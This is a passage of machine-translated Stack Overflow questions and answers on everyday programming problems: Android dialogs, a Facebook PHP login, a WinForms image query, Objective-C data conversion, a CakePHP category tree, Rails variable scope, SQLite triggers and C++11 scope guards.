                        + getString(R.string.cachext3));
        break;
    case 1:
        System.out.println("msg1");
        processdialog
                .setMessage(getString(R.string.formating)
                        + folderpath
                        + getString(R.string.dataext3));
        break;
    case 2:
        System.out.println("msg2");
        processdialog
                .setMessage(getString(R.string.formating)
                        + folderpath
                        + getString(R.string.systemext3));
        break;
    case 3:
        System.out.println("endmsg");
        processdialog.dismiss();
        break;
    } 
```

最后一个 break 并不是绝对需要的，但总是以 break 结束它们是一个好习惯，这样如果你以后添加一个新案例，你就不必记得在前一个案例中添加一个 break。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:38:42.067

我不确定我是否理解 - 但你的代码只是“触发”`sendMessages`而没有任何命令。因此，特别是它会遍历每个 if 语句，触发相关的消息，然后 - 无论这些消息或其他任何地方发生什么，它都会到达`handler.sendMessage(endmessage);` 并且 justz 也会触发它。

现在我看到一个“看门人”检查何时发送您的 endMsg。

这是你的问题吗？

# php - facebook登录集成没有获取我的用户ID

> ID：10270299
> 
> 赞同：0
> 
> 时间：2012-04-22T17:31:25.597
> 
> 标签：php, facebook, fbconnect

我按照本教程集成 facebook：http: [//25labs.com/tutorial-integrate-facebook-connect-to-your-website-using-php-sdk-v-3-xx-which-uses-graph-api/](http://25labs.com/tutorial-integrate-facebook-connect-to-your-website-using-php-sdk-v-3-x-x-which-uses-graph-api/)

问题是当我单击登录链接并允许应用程序时，当我 print_r 得到 $_SESSION

```
Array ( [fb_**MY_APP_ID**_state] => 22decb94e83299b9c31113623621eeb2 [userID] => ) 
```

为什么它没有得到我的用户ID？！

您可以在此处查看孔脚本：

[我无法使 Facebook PHP-SDK 3.x 注册/登录用户集成工作](https://stackoverflow.com/questions/10262857/i-cant-make-the-facebook-php-sdk-3-x-register-login-user-integration-to-work)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:38:39.523

你可以试试[http://thinkdiff.net/facebook/php-sdk-3-0-graph-api-base-facebook-connect-tutorial/](http://thinkdiff.net/facebook/php-sdk-3-0-graph-api-base-facebook-connect-tutorial/)

这是带有最新 php sdk 的最新和工作教程

# winforms - 无法从数据库中读取图像

> ID：10270302
> 
> 赞同：0
> 
> 时间：2012-04-22T17:31:46.903
> 
> 标签：winforms

我正在尝试从 SQL Server 数据库中读取图像，但出现错误：

> 参数无效

谁能帮我？如何解决？

```
byte[] im = connection.ReadImg(id);

if (im != null)
{
   MemoryStream st1 = new MemoryStream(im);
   pictureBox1.Image = Image.FromStream(st1);
}
else
   pictureBox1.Image = Image.FromFile(fn);

public byte[] ReadImg(string id)
{
    cmd.Connection = con;
    cmd.CommandText = "SELECT photo FROM User WHERE id=" + id;
    byte[] image = null;

    con.Open();

    try
    {
       image = (byte[])cmd.ExecuteScalar();
    }
    catch
    {
       image = null;
    }

    con.Close();

    return image;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:59:09.753

如果`id`是字符串，则必须将其作为字符串传递：

```
cmd.CommandText = "SELECT photo FROM User WHERE id=@id";
cmd.Parameters.AddWithValue("@id", id); 
```

如果不使用推荐的参数方式，问题是您需要将字符串参数括在单引号中：

```
cmd.CommandText = "SELECT photo FROM User WHERE id='" + id + "'"; 
```

这被认为是不好的做法。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-29T00:31:53.920

该`SELECT`语句不返回标量；您需要使用`ExecuteReader`或类似的；

```
SqlDataReader reader = cmd.ExecuteReader();
using(reader)
{
    while(reader.Read())
    {
        // Do something with reader["photo"].
    }
} 
```

为了提供更多，我们需要 和 的数据`id`类型`photo`。

# objective-c - 从数据对象获取网页

> ID：10270310
> 
> 赞同：0
> 
> 时间：2012-04-22T17:32:29.717
> 
> 标签：objective-c, nsdata, nsurl

我对目标 c 相当陌生，但我正在使用此代码

```
 NSURL *url = [NSURL URLWithString:@"http://xxx.com"];
NSURLRequest *req = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReturnCacheDataElseLoad timeoutInterval:30];
NSURLResponse *resp = nil;
NSData *data = [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
NSLog(@"received %???", [data XYZ]); 
```

尝试抓取网页的原始内容。我必须插入什么而不是 XYZ（显然是？？？），这样我才能打印网站数据。我知道代码会拉下一些数据，因为我可以使用 XYZ = length 来获取传入数据的大小。如果有人可以提供帮助，那就太好了！

（如果有人可以另外解释我是如何在苹果文档中找到这个的，那也将非常有用）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:38:08.277

我假设您的意思是将 NSData 转换为 NSString 以便您可以打印它？

你应该使用

```
[NSString stringWithData:data encoding:NSUTF8StringEncoding] 
```

从数据中创建一个字符串。请注意，并非所有网站的编码都是 UTF8，因此它可能不会始终产生正确的输出。

您可以通过浏览在线文档轻松找到这些方法：http: [//developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html](http://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html)

# c# - 将 ListView 复制到 ListView - C# .NET 2.0

> ID：10270311
> 
> 赞同：0
> 
> 时间：2012-04-22T17:32:39.357
> 
> 标签：c#, .net, forms

我正在尝试从另一个线程访问 ListView 对象。我这样做的方式是为新线程创建一个临时 ListView，然后在填充新列表时每秒将这个临时 ListView 复制回原始列表。

我在复制 ListView 对象时遇到了困难。我环顾四周，找到了复制项目的方法，但我也需要列和结构也相同。

如果我只是这样做：

`ListView lv_temp = lv_original`

然后它通过引用复制它，我会得到更多的线程访问错误。

那么如何按值进行完整的克隆呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:40:00.677

你想要做的是深拷贝列表，所以你可以使用这个扩展：

```
/// <summary>
/// Reference Article http://www.codeproject.com/KB/tips/SerializedObjectCloner.aspx
/// 
/// Provides a method for performing a deep copy of an object.
/// Binary Serialization is used to perform the copy.
/// </summary>

public static class ObjectCopier
{
    /// <summary>
    /// Perform a deep Copy of the object.
    /// </summary>
    /// <typeparam name="T">The type of object being copied.</typeparam>
    /// <param name="source">The object instance to copy.</param>
    /// <returns>The copied object.</returns>
    public static T Clone<T>(T source)
    {
        if (!typeof(T).IsSerializable)
        {
            throw new ArgumentException("The type must be serializable.", "source");
        }

        // Don't serialize a null object, simply return the default for that object
        if (Object.ReferenceEquals(source, null))
        {
            return default(T);
        }

        IFormatter formatter = new BinaryFormatter();
        Stream stream = new MemoryStream();
        using (stream)
        {
            formatter.Serialize(stream, source);
            stream.Seek(0, SeekOrigin.Begin);
            return (T)formatter.Deserialize(stream);
        }
    }
} 
```

现在，请问您为什么要这样做，为什么不将列表传递给另一个线程，仅此而已（鉴于您要再次对其进行修改）。如果它是一个 UI 控件（这可能是我所看到的），您可以使用背景 ItemsSource（来自另一个线程），然后使用 Dispatcher 将其用作 UI 上的源。如果这就是您想要的，请告诉我以提供更多详细信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:46:32.893

您需要提供一个对象作为数据源。当您的数据源更新时，UI 控件也会更新。否则，如果您遇到线程问题，请使用`SynchronizationContext.Current`并分配给`sync`字段成员，然后：

```
 // since I believe you don't have lambdas in .net 2.0 I'll try to write this out proper
  // although it is untested, but I hope you get the idea
  sync.Send(new SendOrPostCallback(SendCallBack), stateObject);

  void SendCallBack(object state) {
     // perform UI tasks here
  } 
```

[SynchronizationContext](http://msdn.microsoft.com/en-us/library/system.threading.synchronizationcontext%28v=vs.80%29.aspx)是 .net 2.0 中的新内容

...再次，这是未经测试的，但如果我不得不这样做，我会从这里开始。顺便说一句，在 .net 3.0(?) 中，我们写道：

```
 sync.Send((state) => {
     // perform UI tasks here
  }, stateObject); 
```

**更新**
找到答案[你如何绑定](https://stackoverflow.com/q/267410/210709)...。所以没有我最初假设的 DataSource 属性。

# objective-c - 是否可以挂钩将文本放在 Mac OS 上的 API 调用？

> ID：10270314
> 
> 赞同：-1
> 
> 时间：2012-04-22T17:33:02.553
> 
> 标签：objective-c, macos, api

有一个名为[PPStream](http://www.pps.tv/)的程序，目前只有中文版，它允许访问无数的广告支持的电影和电视剧。问题是它是中文的，菜单无法辨认。

是否可以连接到 Mac OS 的 API 中将文本放在屏幕上的部分，以便它首先通过一个单词列表将其路由，将文本翻译成英文？API 挂钩是否能够区分调用 API 的不同应用程序？

我对 Mac API 完全没有经验，只是在思考这是否值得追求。

谢谢。

**编辑**：我想在 API 级别执行此操作的原因是我需要动态调度 HTTP 查询以及要翻译的字符串列表（电影标题中文 -> 英文），并且 edit-the-i18n-file 方法不会不行。还有其他建议吗？

* * *

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:44:01.650

我自己还没有下载、安装或运行 PPStream，所以从某种意义上说，我是在说“我的后端”，但是有很多方法可以本地化应用程序。但是您确实需要访问原始的、未编译的代码和项目才能正确执行此操作。

保存字符串资源的三种最可能的方式是：

1)

应用程序可能有一个字符串文件，它从中获取要在界面中显示的字符串。

您*可以*复制此字符串文件并将其设置为英语或您选择的任何语言。

2)

字符串可能会被烘焙到代码本身中。对于商业级 MacOS 和 iOS 应用程序来说，这通常是不可以的，但是懒惰和/或没有经验的开发人员可以这样做，尤其是如果他们认为他们的应用程序永远不会以其他语言使用。

3)

最有可能的设置是在应用程序包中隐藏一个文件夹，在“Resources”文件夹内，其名称为“en.lproj”或“English.lproj”或“de.lproj”或“zh_CN”。 lproj”或“zh_TW.lproj”（如果这只是中文的话，最后两个尤其可能）。

这些文件夹中将包含本地化的 XIB（或更旧的 NIB）文件。如果您制作此文件夹的副本，然后修改新制作的副本以添加您的新语言。

选项 1 和 3 是您可能能够复制然后修改的选项，但它可能再次不起作用（尤其是现在有代码和应用程​​序签名的时候）。我从来没有在没有附带项目的情况下尝试过这个，所以如果你成功了，你应该评论你的问题和/或这个答案并让我们知道。

# cakephp - cakephp树模型结构

> ID：10270319
> 
> 赞同：0
> 
> 时间：2012-04-22T17:34:09.137
> 
> 标签：cakephp, cakephp-model

我想得到一个类别树来显示它：

```
cat1
    subcat1
    subcat2
    subcat3
        subsubcat1
cat2
    subcat1
... 
```

我有这张桌子：

```
CREATE TABLE IF NOT EXISTS `kategorie` (
  `id` int(11) NOT NULL auto_increment,
  `name` varchar(256) collate utf8_polish_ci NOT NULL,
  `father` int(11) NOT NULL default '-7',
  PRIMARY KEY  (`id`),
  UNIQUE KEY `name` (`name`)
) 
```

所以每条记录只包含自己和父ID（我不能添加左右ID）。

现在我制作了这个模型：

```
class Category extends AppModel 
    {
        public $name = 'Category';
        public $useDbConfig = 'external';
        public $useTable = 'kategorie';

        var $belongsTo = array(  
            'ParentCategory' => array(  
                'className' => 'Category',  
                'foreignKey' => 'father'  
        ));  

        var $hasMany = array(  
            'ChildCategory' => array(  
                'className' => 'Category',  
                'foreignKey' => 'father'  
        ));     

    } 
```

和控制器：

```
class CategoriesController extends AppController {

        public function beforeFilter() 
        {
            parent::beforeFilter();
            //$this->Auth->allow('add','logout');
        }

        public function index()
        {
            $res = $this->Category->find('all');
            //$this->set('categories', $this->Category->find('all') );  
            debug($res); die;           
        }   
    } 
```

调试输出是这样的：

```
array(
    (int) 0 => array(
        'Category' => array(
            'id' => '1',
            'name' => 'catname',
            'father' => '2'
        ),
        'ParentCategory' => array(
            'id' => '2',
            'name' => 'catname',
            'father' => '3'
        ),
        'ChildCategory' => array(
            (int) 0 => array(
                'id' => '161',
                'name' => 'catname',
                'father' => '1'
            )
        )
    ),
    (int) 1 => array(
        'Category' => array(
            'id' => '2',
            'name' => 'catname',
            'father' => '3'
        ),
        'ParentCategory' => array(
            'id' => '3',
            'name' => 'catname',
            'father' => '4'
        ),
        'ChildCategory' => array(
            (int) 0 => array(
                'id' => '1',
                'name' => 'catname',
                'father' => '2'
            ),
            (int) 1 => array(
                'id' => '5',
                'name' => 'catname',
                'father' => '2'
            ),
            (int) 2 => array(
                'id' => '489',
                'name' => 'catname',
                'father' => '2'
            )
        )
    ),
... 
```

所以基本上我得到类别对象的数组（这些对象的数量是类别的数量（全部，甚至是子类别）。每个类别都有一个父类别和子类别数组......

这不是我想要的，因为我必须“手动”解析数组以构建类别树，而且速度会很慢，因为我必须在数组中找到具有指定 id 的类别（类别 id 不是它在数组中的索引） ...

也许 some1 知道任何特殊技巧来获得一个漂亮、有用的类别树？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:47:21.347

尝试查看 find 方法的其他参数。您可以尝试使用

```
$res = $this->Category->find('threaded'); 
```

[您可以在http://book.cakephp.org/2.0/en/models/retrieving-your-data.html#find-threaded](http://book.cakephp.org/2.0/en/models/retrieving-your-data.html#find-threaded)找到更多详细信息。

# ruby-on-rails - 通常需要清除 Rails 和 MVC 架构中的实例变量范围

> ID：10270321
> 
> 赞同：2
> 
> 时间：2012-04-22T17:34:11.493
> 
> 标签：ruby-on-rails, ruby-on-rails-3, model-view-controller

我需要对 Rails 应用程序中实例变量的范围有所了解（不确定其他框架是否具有类似的范例）

假设我有一个实例变量

```
@page_count = some_value 
```

在控制器的索引操作中

所以，关于这个变量的可访问性。它应该可以在它的视图中访问，我猜也可以从模型中访问。（对吗？）

现在，如果我调用其他操作（通过其他请求）说，在同一个控制器中导出，变量 @page_count 不会有它在索引操作中设置的值

（***实例变量不会在不同请求之间保留其值，对吧？***）

目前为了解决这个问题，我正在使用会话范围变量，

```
session[page_count] = some_value # inside index action 
```

现在该变量将在其他操作中可用，包括导出操作（通过其他请求）

这是好方法吗？使用会话？或者有更好的选择来存储不同请求之间的值？

建议/评论/指针，好吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:55:36.703

我认为这取决于您设置`@page_count`的内容。

如果它就像 db 表“pages”中的行数，并且您将其设置为，

```
@page_count = Page.all.count 
```

然后你可以使用 a`before_filter`并为你需要的每个控制器操作设置值。[这是有关过滤器](http://guides.rubyonrails.org/action_controller_overview.html#filters)的更多信息。

否则，如果 @page_count 的值是计算出来的并且每次操作都会发生变化，那么我认为您只需要在每个操作中定义它即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T06:02:45.840

I am not much of experience person but what if you create it as global variable once you set the value of global variable then you can access it in same controller with different methods. I know it is not good practice to use global variable but I hope It solve your problem.

# android - 在 Android 上，SQLite 触发器会触发其他触发器吗？

> ID：10270326
> 
> 赞同：3
> 
> 时间：2012-04-22T17:35:23.377
> 
> 标签：android, sqlite, triggers

在 SQLite 中考虑这个 SQL：

```
CREATE TABLE X (Xid INTEGER PRIMARY KEY);
CREATE TABLE Y (Yid INTEGER PRIMARY KEY, Xid INTEGER NOT NULL);
CREATE TABLE Z (Yid INTEGER PRIMARY KEY, Blah INTEGER NOT NULL);

CREATE TRIGGER IF NOT EXISTS OnDeleteX
    BEFORE DELETE ON X
    FOR EACH ROW BEGIN
        DELETE FROM Y WHERE Xid = OLD.Xid;
    END;

CREATE TRIGGER IF NOT EXISTS OnDeleteY
    BEFORE DELETE ON Y
    FOR EACH ROW BEGIN
        DELETE FROM Z WHERE Yid = OLD.Yid;
    END; 
```

当我删除一行时，`X`我希望它的链接项目`Y` **也会** `Z`被删除。我已经使用 SQLite 3.7.11 在我的 PC 上验证了这种行为。在 Android 4.0.4 上，这似乎不起作用。

**问：** Android 上的 SQLite 是否支持级联触发器？即触发其他触发器的触发器。

此外，是否某种事务会阻止触发器工作？

# c++ - 最简单最整洁的c++11 ScopeGuard

> ID：10270328
> 
> 赞同：44
> 
> 时间：2012-04-22T17:35:26.417
> 
> 标签：c++, lambda, c++11, exception-safety, scopeguard

我正在尝试编写一个[基于 Alexandrescu 概念](http://www.drdobbs.com/cpp/184403758)但使用 c++11 习语的简单 ScopeGuard。

```
namespace RAII
{
    template< typename Lambda >
    class ScopeGuard
    {
        mutable bool committed;
        Lambda rollbackLambda; 
        public:

            ScopeGuard( const Lambda& _l) : committed(false) , rollbackLambda(_l) {}

            template< typename AdquireLambda >
            ScopeGuard( const AdquireLambda& _al , const Lambda& _l) : committed(false) , rollbackLambda(_l)
            {
                _al();
            }

            ~ScopeGuard()
            {
                if (!committed)
                    rollbackLambda();
            }
            inline void commit() const { committed = true; }
    };

    template< typename aLambda , typename rLambda>
    const ScopeGuard< rLambda >& makeScopeGuard( const aLambda& _a , const rLambda& _r)
    {
        return ScopeGuard< rLambda >( _a , _r );
    }

    template<typename rLambda>
    const ScopeGuard< rLambda >& makeScopeGuard(const rLambda& _r)
    {
        return ScopeGuard< rLambda >(_r );
    }
} 
```

这是用法：

```
void SomeFuncThatShouldBehaveAtomicallyInCaseOfExceptions() 
{
   std::vector<int> myVec;
   std::vector<int> someOtherVec;

   myVec.push_back(5);
   //first constructor, adquire happens elsewhere
   const auto& a = RAII::makeScopeGuard( [&]() { myVec.pop_back(); } );  

   //sintactically neater, since everything happens in a single line
   const auto& b = RAII::makeScopeGuard( [&]() { someOtherVec.push_back(42); }
                     , [&]() { someOtherVec.pop_back(); } ); 

   b.commit();
   a.commit();
} 
```

由于我的版本比那里的大多数示例（如 Boost ScopeExit）短得多，我想知道我遗漏了哪些专业。希望我在这里处于 80/20 的场景中（我得到了 80% 的整洁度和 20% 的代码行），但我不禁想知道我是否遗漏了一些重要的东西，或者是否有一些缺点值得提到这个版本的 ScopeGuard 成语

谢谢！

**编辑**我注意到 makeScopeGuard 的一个非常重要的问题，它在构造函数中采用了 adquire lambda。如果 adquire lambda 抛出，则永远不会调用 release lambda，因为范围保护从未完全构造。在许多情况下，这是所需的行为，但我觉得有时也需要一个在抛出发生时调用回滚的版本：

```
//WARNING: only safe if adquire lambda does not throw, otherwise release lambda is never invoked, because the scope guard never finished initialistion..
template< typename aLambda , typename rLambda>
ScopeGuard< rLambda > // return by value is the preferred C++11 way.
makeScopeGuardThatDoesNOTRollbackIfAdquireThrows( aLambda&& _a , rLambda&& _r) // again perfect forwarding
{
    return ScopeGuard< rLambda >( std::forward<aLambda>(_a) , std::forward<rLambda>(_r )); // *** no longer UB, because we're returning by value
}

template< typename aLambda , typename rLambda>
ScopeGuard< rLambda > // return by value is the preferred C++11 way.
makeScopeGuardThatDoesRollbackIfAdquireThrows( aLambda&& _a , rLambda&& _r) // again perfect forwarding
{
    auto scope = ScopeGuard< rLambda >(std::forward<rLambda>(_r )); // *** no longer UB, because we're returning by value
    _a();
    return scope;
} 
```

* * *

所以为了完整起见，我想把完整的代码放在这里，包括测试：

* * *

```
#include <vector>

namespace RAII
{

    template< typename Lambda >
    class ScopeGuard
    {
        bool committed;
        Lambda rollbackLambda; 
        public:

            ScopeGuard( const Lambda& _l) : committed(false) , rollbackLambda(_l) {}

            ScopeGuard( const ScopeGuard& _sc) : committed(false) , rollbackLambda(_sc.rollbackLambda) 
            {
                if (_sc.committed)
                   committed = true;
                else
                   _sc.commit();
            }

            ScopeGuard( ScopeGuard&& _sc) : committed(false) , rollbackLambda(_sc.rollbackLambda)
            {
                if (_sc.committed)
                   committed = true;
                else
                   _sc.commit();
            }

            //WARNING: only safe if adquire lambda does not throw, otherwise release lambda is never invoked, because the scope guard never finished initialistion..
            template< typename AdquireLambda >
            ScopeGuard( const AdquireLambda& _al , const Lambda& _l) : committed(false) , rollbackLambda(_l)
            {
               std::forward<AdquireLambda>(_al)();
            }

            //WARNING: only safe if adquire lambda does not throw, otherwise release lambda is never invoked, because the scope guard never finished initialistion..
            template< typename AdquireLambda, typename L >
            ScopeGuard( AdquireLambda&& _al , L&& _l) : committed(false) , rollbackLambda(std::forward<L>(_l))
            {
                std::forward<AdquireLambda>(_al)(); // just in case the functor has &&-qualified operator()
            }

            ~ScopeGuard()
            {
                if (!committed)
                    rollbackLambda();
            }
            inline void commit() { committed = true; }
    };

    //WARNING: only safe if adquire lambda does not throw, otherwise release lambda is never invoked, because the scope guard never finished initialistion..
    template< typename aLambda , typename rLambda>
    ScopeGuard< rLambda > // return by value is the preferred C++11 way.
    makeScopeGuardThatDoesNOTRollbackIfAdquireThrows( aLambda&& _a , rLambda&& _r) // again perfect forwarding
    {
        return ScopeGuard< rLambda >( std::forward<aLambda>(_a) , std::forward<rLambda>(_r )); // *** no longer UB, because we're returning by value
    }

    template< typename aLambda , typename rLambda>
    ScopeGuard< rLambda > // return by value is the preferred C++11 way.
    makeScopeGuardThatDoesRollbackIfAdquireThrows( aLambda&& _a , rLambda&& _r) // again perfect forwarding
    {
        auto scope = ScopeGuard< rLambda >(std::forward<rLambda>(_r )); // *** no longer UB, because we're returning by value
        _a();
        return scope;
    }

    template<typename rLambda>
    ScopeGuard< rLambda > makeScopeGuard(rLambda&& _r)
    {
        return ScopeGuard< rLambda >( std::forward<rLambda>(_r ));
    }

    namespace basic_usage
    {
        struct Test
        {

            std::vector<int> myVec;
            std::vector<int> someOtherVec;
            bool shouldThrow;
            void run()
            {
                shouldThrow = true;
                try
                {
                    SomeFuncThatShouldBehaveAtomicallyInCaseOfExceptionsUsingScopeGuardsThatDoesNOTRollbackIfAdquireThrows();
                } catch (...)
                {
                    AssertMsg( myVec.size() == 0 && someOtherVec.size() == 0 , "rollback did not work");
                }
                shouldThrow = false;
                SomeFuncThatShouldBehaveAtomicallyInCaseOfExceptionsUsingScopeGuardsThatDoesNOTRollbackIfAdquireThrows();
                AssertMsg( myVec.size() == 1 && someOtherVec.size() == 1 , "unexpected end state");
                shouldThrow = true;
                myVec.clear(); someOtherVec.clear();  
                try
                {
                    SomeFuncThatShouldBehaveAtomicallyInCaseOfExceptionsUsingScopeGuardsThatDoesRollbackIfAdquireThrows();
                } catch (...)
                {
                    AssertMsg( myVec.size() == 0 && someOtherVec.size() == 0 , "rollback did not work");
                }
            }

            void SomeFuncThatShouldBehaveAtomicallyInCaseOfExceptionsUsingScopeGuardsThatDoesNOTRollbackIfAdquireThrows() //throw()
            {

                myVec.push_back(42);
                auto a = RAII::makeScopeGuard( [&]() { HAssertMsg( myVec.size() > 0 , "attempt to call pop_back() in empty myVec"); myVec.pop_back(); } );  

                auto b = RAII::makeScopeGuardThatDoesNOTRollbackIfAdquireThrows( [&]() { someOtherVec.push_back(42); }
                                    , [&]() { HAssertMsg( myVec.size() > 0 , "attempt to call pop_back() in empty someOtherVec"); someOtherVec.pop_back(); } );

                if (shouldThrow) throw 1; 

                b.commit();
                a.commit();
            }

            void SomeFuncThatShouldBehaveAtomicallyInCaseOfExceptionsUsingScopeGuardsThatDoesRollbackIfAdquireThrows() //throw()
            {
                myVec.push_back(42);
                auto a = RAII::makeScopeGuard( [&]() { HAssertMsg( myVec.size() > 0 , "attempt to call pop_back() in empty myVec"); myVec.pop_back(); } );  

                auto b = RAII::makeScopeGuardThatDoesRollbackIfAdquireThrows( [&]() { someOtherVec.push_back(42); if (shouldThrow) throw 1; }
                                    , [&]() { HAssertMsg( myVec.size() > 0 , "attempt to call pop_back() in empty someOtherVec"); someOtherVec.pop_back(); } );

                b.commit();
                a.commit();
            }
        };
    }
} 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2015-02-09T15:34:56.333

更短：我不知道你们为什么坚持将模板放在警卫班上。

```
#include <functional>

class scope_guard {
public: 
    template<class Callable> 
    scope_guard(Callable && undo_func) try : f(std::forward<Callable>(undo_func)) {
    } catch(...) {
        undo_func();
        throw;
    }

    scope_guard(scope_guard && other) : f(std::move(other.f)) {
        other.f = nullptr;
    }

    ~scope_guard() {
        if(f) f(); // must not throw
    }

    void dismiss() noexcept {
        f = nullptr;
    }

    scope_guard(const scope_guard&) = delete;
    void operator = (const scope_guard&) = delete;

private:
    std::function<void()> f;
}; 
```

请注意，清理代码不抛出是必不可少的，否则您会遇到与抛出析构函数类似的情况。

用法：

```
// do step 1
step1();
scope_guard guard1 = [&]() {
    // revert step 1
    revert1();
};

// step 2
step2();
guard1.dismiss(); 
```

我的灵感来自与 OP 相同的[DrDobbs 文章](https://web.archive.org/web/20190405190713/http://www.drdobbs.com/cpp/generic-change-the-way-you-write-excepti/184403758)。

* * *

2017/2018 年编辑：在观看了 André 链接的（部分）[Andrei 的演示文稿](http://channel9.msdn.com/Shows/Going+Deep/C-and-Beyond-2012-Andrei-Alexandrescu-Systematic-Error-Handling-in-C)后（我跳到最后，上面写着“痛苦地接近理想！”）我意识到这是可行的。大多数时候，您不想为所有事情都配备额外的警卫。你只是做一些事情，最后它要么成功，要么应该发生回滚。

2018 年编辑：添加了执行策略，消除了`dismiss`调用的必要性。

```
#include <functional>
#include <deque>

class scope_guard {
public:
    enum execution { always, no_exception, exception };

    scope_guard(scope_guard &&) = default;
    explicit scope_guard(execution policy = always) : policy(policy) {}

    template<class Callable>
    scope_guard(Callable && func, execution policy = always) : policy(policy) {
        this->operator += <Callable>(std::forward<Callable>(func));
    }

    template<class Callable>
    scope_guard& operator += (Callable && func) try {
        handlers.emplace_front(std::forward<Callable>(func));
        return *this;
    } catch(...) {
        if(policy != no_exception) func();
        throw;
    }

    ~scope_guard() {
        if(policy == always || (std::uncaught_exception() == (policy == exception))) {
            for(auto &f : handlers) try {
                f(); // must not throw
            } catch(...) { /* std::terminate(); ? */ }
        }
    }

    void dismiss() noexcept {
        handlers.clear();
    }

private:
    scope_guard(const scope_guard&) = delete;
    void operator = (const scope_guard&) = delete;

    std::deque<std::function<void()>> handlers;
    execution policy = always;
}; 
```

用法：

```
scope_guard scope_exit, scope_fail(scope_guard::execution::exception);

action1();
scope_exit += [](){ cleanup1(); };
scope_fail += [](){ rollback1(); };

action2();
scope_exit += [](){ cleanup2(); };
scope_fail += [](){ rollback2(); };

// ... 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-04-22T18:27:35.493

Boost.ScopeExit 是一个需要与非 C++11 代码一起工作的宏，即无法访问该语言中的 lambda 的代码。它使用了一些巧妙的模板技巧（比如滥用`<`模板和比较运算符所产生的歧义！）和预处理器来模拟 lambda 功能。这就是代码更长的原因。

显示的代码也有问题（这可能是使用现有解决方案的最强有力的理由）：由于返回对临时对象的引用，它会调用未定义的行为。

由于您正在尝试使用 C++11 功能，因此可以通过使用移动语义、右值引用和完美转发来大大改进代码：

```
template< typename Lambda >
class ScopeGuard
{
    bool committed; // not mutable
    Lambda rollbackLambda; 
    public:

        // make sure this is not a copy ctor
        template <typename L,
                  DisableIf<std::is_same<RemoveReference<RemoveCv<L>>, ScopeGuard<Lambda>>> =_
        >
        /* see http://loungecpp.net/w/EnableIf_in_C%2B%2B11
         * and http://stackoverflow.com/q/10180552/46642 for info on DisableIf
         */
        explicit ScopeGuard(L&& _l)
        // explicit, unless you want implicit conversions from *everything*
        : committed(false)
        , rollbackLambda(std::forward<L>(_l)) // avoid copying unless necessary
        {}

        template< typename AdquireLambda, typename L >
        ScopeGuard( AdquireLambda&& _al , L&& _l) : committed(false) , rollbackLambda(std::forward<L>(_l))
        {
            std::forward<AdquireLambda>(_al)(); // just in case the functor has &&-qualified operator()
        }

        // move constructor
        ScopeGuard(ScopeGuard&& that)
        : committed(that.committed)
        , rollbackLambda(std::move(that.rollbackLambda)) {
            that.committed = true;
        }

        ~ScopeGuard()
        {
            if (!committed)
                rollbackLambda(); // what if this throws?
        }
        void commit() { committed = true; } // no need for const
};

template< typename aLambda , typename rLambda>
ScopeGuard< rLambda > // return by value is the preferred C++11 way.
makeScopeGuard( aLambda&& _a , rLambda&& _r) // again perfect forwarding
{
    return ScopeGuard< rLambda >( std::forward<aLambda>(_a) , std::forward<rLambda>(_r )); // *** no longer UB, because we're returning by value
}

template<typename rLambda>
ScopeGuard< rLambda > makeScopeGuard(rLambda&& _r)
{
    return ScopeGuard< rLambda >( std::forward<rLambda>(_r ));
} 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2013-03-08T22:29:51.317

您可能有兴趣观看Andrei 自己的关于如何使用 c++11 改进 scopedguard 的[演示文稿](http://channel9.msdn.com/Shows/Going+Deep/C-and-Beyond-2012-Andrei-Alexandrescu-Systematic-Error-Handling-in-C)

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2016-06-17T10:35:14.077

您可以将`std::unique_ptr`其用于实现 RAII 模式的目的。例如：

```
vector<int> v{};
v.push_back(42);
unique_ptr<decltype(v), function<void(decltype(v)*)>>
    p{&v, [] (decltype(v)* v) { if (uncaught_exception()) { v->pop_back(); }}};
throw exception(); // rollback 
p.release(); // explicit commit 
```

如果在异常处于活动状态时离开了范围，则删除器函数会`unique_ptr p`回滚以前插入的值。如果您更喜欢显式提交，您可以删除删除函数中的问题并在释放指针`uncaugth_exception()`的块末尾添加。`p.release()`在此处查看[演示](https://ideone.com/q8AxNt)。

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2018-05-08T18:48:45.090

我使用它就像一个魅力，没有额外的代码。

```
shared_ptr<int> x(NULL, [&](int *) { CloseResource(); }); 
```

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2016-01-24T13:42:17.057

这种方法有可能通过提案[P0052R0在 C++17 或 Library Fundamentals TS 中标准化](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2015/p0052r0.pdf)

```
template <typename EF>
scope_exit<see below> make_scope_exit(EF &&exit_function) noexcept;

template <typename EF>
scope_exit<see below> make_scope_fail(EF && exit_function) noexcept;

template <typename EF>
scope_exit<see below> make_scope_success(EF && exit_function) noexcept; 
```

乍一看，这有同样的警告，`std::async`因为您必须存储返回值，否则将立即调用析构函数并且它不会按预期工作。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2020-04-16T04:29:41.087

大多数其他解决方案都涉及`move`lambda 的 a，例如，通过使用 lambda 参数来初始化 a`std::function`或从 lambda 推导出的类型的对象。

这是一个非常简单的方法，它允许使用命名的 lambda 而无需移动它（需要 C++17）：

```
template<typename F>
struct OnExit
{
    F func;
    OnExit(F&& f): func(std::forward<F>(f)) {}
    ~OnExit() { func();  }
